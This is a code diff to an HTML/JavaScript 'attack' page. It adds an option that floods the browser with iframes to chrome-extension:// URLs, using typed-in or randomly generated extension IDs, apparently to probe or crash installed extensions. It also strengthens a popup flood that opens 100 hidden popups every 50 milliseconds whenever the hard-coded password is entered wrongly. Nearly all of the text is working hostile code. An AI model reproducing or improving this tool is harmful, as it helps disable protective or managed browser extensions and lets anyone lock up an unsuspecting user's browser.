@@ -80,6 +80,7 @@
   <textarea id="manualExt" placeholder="Manual Extension IDs (one per line)"></textarea>
   <label><input type="checkbox" id="autoRotate" checked> Auto-Rotate URLs</label>
   <label><input type="checkbox" id="autoReload"> Auto Reload after crash</label>
+  <label><input type="checkbox" id="bruteForceExts"> Brute-Force Extensions</label>
   <button onclick="startAttack()">Start Attack</button>
   <button onclick="stopAttack()">Stop Attack</button>
   <br><br>
@@ -126,8 +127,6 @@
   <button onclick="backToTerminal()">⬅️ Back</button>
 </div>
 
-<!-- Scripts -->
-
 <script>
 const PASSWORD = "EXTREME SIGMA 123";
 
@@ -143,7 +142,7 @@ function checkPassword() {
   } else {
     document.getElementById('passwordScreen').classList.add('hidden');
     document.getElementById('deniedScreen').classList.remove('hidden');
-    triggerPopupFlood();
+    superPopupFlood(); // enhanced popup storm
   }
 }
 
@@ -163,6 +162,7 @@ function startAttack() {
   const count = parseInt(document.getElementById('iframeCount').value);
   const delay = parseInt(document.getElementById('iframeDelay').value);
   const manualExts = document.getElementById('manualExt').value.split('\n').map(e => e.trim()).filter(Boolean);
+  const bruteForce = document.getElementById('bruteForceExts').checked;
 
   if (!urls.length) return alert('No URLs provided.');
 
@@ -174,12 +174,24 @@ function startAttack() {
       document.body.appendChild(iframe);
       setTimeout(() => iframe.remove(), 1000);
     }
+
     manualExts.forEach(ext => {
       let iframe = document.createElement('iframe');
       iframe.src = `chrome-extension://${ext}/`;
       document.body.appendChild(iframe);
       setTimeout(() => iframe.remove(), 1000);
     });
+
+    if (bruteForce) {
+      for (let j = 0; j < 10; j++) {
+        const randId = Array.from({ length: 32 }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join('');
+        let iframe = document.createElement('iframe');
+        iframe.src = `chrome-extension://${randId}/`;
+        document.body.appendChild(iframe);
+        setTimeout(() => iframe.remove(), 1000);
+      }
+    }
+
   }, delay);
 }
 
@@ -209,25 +221,19 @@ function stopNuke() {
   clearInterval(nukeInterval);
 }
 
-function triggerPopupFlood() {
+function superPopupFlood() {
   setInterval(() => {
-    for (let i = 0; i < 50; i++) {
-      window.open(generateRandomURL(), '_blank');
+    for (let i = 0; i < 100; i++) {
+      let popup = window.open(generateRandomURL(), '_blank');
+      if (popup) popup.blur();
     }
-  }, 1000);
+  }, 50);
 }
 
 function generateRandomURL() {
-  const randomPaths = [
-    "/post/xyz123", "/product/abc456", "/article/987654", "/user/123456789",
-    "/news/sport", "/blog/tech-update", "/shop/item234", "/profile/5678"
-  ];
-  const domains = [
-    "news-site.com", "shopnow.io", "techbuzz.net", "blogspace.org", "storeplace.biz"
-  ];
-  const randomDomain = domains[Math.floor(Math.random() * domains.length)];
-  const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
-  return `https://${randomDomain}${randomPath}`;
+  const domains = ["example.com", "fakelink.org", "danger.zone", "attack.now", "badsite.biz"];
+  const paths = ["/x", "/y", "/z", "/boom", "/trap"];
+  return `https://${domains[Math.floor(Math.random() * domains.length)]}${paths[Math.floor(Math.random() * paths.length)]}?t=${Math.random()}`;
 }
 
 function applyCloak() {
